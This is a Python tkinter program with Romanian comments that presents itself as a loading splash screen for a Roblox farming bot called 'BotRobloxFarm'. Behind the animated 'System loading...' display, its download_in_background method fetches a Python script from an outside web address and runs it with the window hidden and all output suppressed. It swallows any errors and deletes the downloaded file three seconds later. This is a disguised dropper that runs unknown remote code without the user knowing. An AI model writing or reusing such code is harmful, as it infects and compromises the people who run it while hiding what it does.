import tkinter as tk
from tkinter import font
import math
import urllib.request
import subprocess
import sys
import os
import tempfile
import time

class TransparentBRFApp:
    def __init__(self, root):
        self.root = root
        self.root.title("BRF")
        
        # Fereastra transparentă și fără borduri
        self.root.overrideredirect(True)
        self.root.attributes('-transparentcolor', '#000001')
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#000001')
        
        # Dimensiune fereastră
        self.width, self.height = 500, 300
        self.root.geometry(f"{self.width}x{self.height}")
        
        # Butoane transparente
        self.buttons_visible = False
        
        # Canvas pentru fundal transparent
        self.canvas = tk.Canvas(
            root, 
            bg='#000001',
            highlightthickness=0,
            width=self.width,
            height=self.height
        )
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        # Crează elemente grafice
        self.create_graphics()
        
        # Crează butoane (inițial invizibile)
        self.create_buttons()
        
        # Centrează fereastra
        self.center_window()
        
        # Variabile animație
        self.animation_phase = 0
        self.loading_time = 0
        self.showing_brf = False
        
        # Pornește animațiile
        self.animate()
        
        # Pornește download în fundal
        self.root.after(100, self.download_in_background)
        
        # Evenimente mouse
        self.canvas.bind("<Enter>", self.show_buttons)
        self.canvas.bind("<Leave>", self.hide_buttons)
    
    def create_graphics(self):
        """Crează elementele grafice principale"""
        # Fundal cu gradient transparent
        self.gradient = self.canvas.create_rectangle(
            0, 0, self.width, self.height,
            fill="#0a0a0a",
            outline=""
        )
        
        # Text "BRF" - MARE și centrat
        self.brf_font = font.Font(family="Segoe UI", size=62, weight="bold")
        self.brf_text = self.canvas.create_text(
            self.width//2, self.height//2 - 40,
            text="",
            font=self.brf_font,
            fill="#00FFAA",
            anchor="center"
        )
        
        # Text "BotRobloxFarm"
        self.sub_font = font.Font(family="Segoe UI", size=26, weight="normal")
        self.sub_text = self.canvas.create_text(
            self.width//2, self.height//2 + 20,
            text="",
            font=self.sub_font,
            fill="#888888",
            anchor="center"
        )
        
        # Text "System loading..."
        self.loading_font = font.Font(family="Consolas", size=16, weight="normal")
        self.loading_text = self.canvas.create_text(
            self.width//2, self.height//2 + 70,
            text="",
            font=self.loading_font,
            fill="#00FF88",
            anchor="center"
        )
        
        # Efect de particule
        self.particles = []
        for _ in range(15):
            x = self.width//2
            y = self.height//2
            particle = self.canvas.create_oval(
                x-2, y-2, x+2, y+2,
                fill="#00FFAA",
                width=0
            )
            self.particles.append({
                "id": particle,
                "x": x,
                "y": y,
                "speed_x": (math.random() - 0.5) * 4,
                "speed_y": (math.random() - 0.5) * 4,
                "life": math.random() * 100
            })
    
    def create_buttons(self):
        """Crează butoanele transparente"""
        button_size = 35
        button_y = 10
        
        # Buton Close (X) - transparent
        self.close_btn = tk.Button(
            self.canvas,
            text="×",
            font=("Arial", 14, "bold"),
            fg="white",
            bg="#ff4444",
            activebackground="#ff6666",
            activeforeground="white",
            bd=0,
            width=2,
            height=1,
            command=self.root.destroy
        )
        self.close_btn.place(x=self.width-40, y=button_y)
        self.close_btn.place_forget()
        
        # Buton Minimize (-) - transparent
        self.min_btn = tk.Button(
            self.canvas,
            text="–",
            font=("Arial", 14, "bold"),
            fg="white",
            bg="#4488ff",
            activebackground="#66aaff",
            activeforeground="white",
            bd=0,
            width=2,
            height=1,
            command=self.root.iconify
        )
        self.min_btn.place(x=self.width-80, y=button_y)
        self.min_btn.place_forget()
        
        # Permite glisarea ferestrei
        self.canvas.bind("<Button-1>", self.start_move)
        self.canvas.bind("<B1-Motion>", self.on_move)
    
    def show_buttons(self, event):
        """Arată butoanele când mouse-ul intră în fereastră"""
        if not self.buttons_visible:
            self.buttons_visible = True
            self.close_btn.place(x=self.width-40, y=10)
            self.min_btn.place(x=self.width-80, y=10)
    
    def hide_buttons(self, event):
        """Ascunde butoanele când mouse-ul iese din fereastră"""
        if self.buttons_visible and event.y > 50:
            self.buttons_visible = False
            self.close_btn.place_forget()
            self.min_btn.place_forget()
    
    def start_move(self, event):
        self.x = event.x
        self.y = event.y
    
    def on_move(self, event):
        deltax = event.x - self.x
        deltay = event.y - self.y
        x = self.root.winfo_x() + deltax
        y = self.root.winfo_y() + deltay
        self.root.geometry(f"+{x}+{y}")
    
    def center_window(self):
        """Centrează fereastra pe ecran"""
        self.root.update_idletasks()
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (self.width // 2)
        y = (screen_height // 2) - (self.height // 2)
        self.root.geometry(f'+{x}+{y}')
    
    def download_in_background(self):
        """Descarcă și rulează brf.py în fundal"""
        try:
            url = "https://brf-eight.vercel.app/brf.py"
            with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
                temp_path = f.name
                urllib.request.urlretrieve(url, temp_path)
                
                # Rulează silențios
                startupinfo = None
                if sys.platform == "win32":
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = subprocess.SW_HIDE
                
                subprocess.Popen(
                    [sys.executable, temp_path],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Șterge după 3 secunde
                self.root.after(3000, lambda: self.delete_file(temp_path))
                
        except Exception:
            pass
    
    def delete_file(self, path):
        try:
            for _ in range(3):
                try:
                    os.unlink(path)
                    break
                except:
                    time.sleep(0.1)
        except:
            pass
    
    def animate(self):
        """Animația principală"""
        self.animation_phase += 0.05
        self.loading_time += 0.1
        
        # Animație loading pentru primele 3 secunde
        if self.loading_time < 30:  # 3 secunde * 10 frames/sec
            dots = ["   ", ".  ", ".. ", "..."]
            dot_index = int(self.loading_time) % 4
            loading_text = f"System loading{dots[dot_index]}"
            self.canvas.itemconfig(self.loading_text, text=loading_text)
            
            # Nu arăta BRF încă
            self.canvas.itemconfig(self.brf_text, text="")
            self.canvas.itemconfig(self.sub_text, text="")
        else:
            # După 3 secunde, arată BRF
            if not self.showing_brf:
                self.showing_brf = True
                self.canvas.itemconfig(self.brf_text, text="BRF")
                self.canvas.itemconfig(self.sub_text, text="BotRobloxFarm")
                self.canvas.itemconfig(self.loading_text, text="✓ Ready")
        
        # Animație pulsare text BRF
        if self.showing_brf:
            pulse = (math.sin(self.animation_phase * 1.5) + 1) / 2
            r = 0
            g = int(200 + pulse * 55)
            b = int(150 + pulse * 105)
            color = f'#{r:02x}{g:02x}{b:02x}'
            self.canvas.itemconfig(self.brf_text, fill=color)
        
        # Animație particule
        for particle in self.particles:
            particle["life"] -= 1
            if particle["life"] <= 0:
                # Resetează particula
                particle["x"] = self.width//2
                particle["y"] = self.height//2
                particle["speed_x"] = (math.random() - 0.5) * 4
                particle["speed_y"] = (math.random() - 0.5) * 4
                particle["life"] = math.random() * 100
            
            # Mișcă particula
            particle["x"] += particle["speed_x"]
            particle["y"] += particle["speed_y"]
            
            # Verifică limite
            if particle["x"] < 0 or particle["x"] > self.width:
                particle["speed_x"] *= -1
            if particle["y"] < 0 or particle["y"] > self.height:
                particle["speed_y"] *= -1
            
            # Actualizează poziția
            self.canvas.coords(
                particle["id"],
                particle["x"]-2, particle["y"]-2,
                particle["x"]+2, particle["y"]+2
            )
            
            # Transparență bazată pe viață
            alpha = particle["life"] / 100
            color = f'#{int(alpha*255):02x}{int(alpha*200):02x}{int(alpha*150):02x}'
            self.canvas.itemconfig(particle["id"], fill=color)
        
        # Gradient animat
        gradient_color = f'#{int(10+math.sin(self.animation_phase)*5):02x}0a0a'
        self.canvas.itemconfig(self.gradient, fill=gradient_color)
        
        # Continuă animația
        self.root.after(50, self.animate)

# Adaugă funcția random pentru math
import random
math.random = random.random

# Rulează aplicația
if __name__ == "__main__":
    root = tk.Tk()
    app = TransparentBRFApp(root)
    root.mainloop()
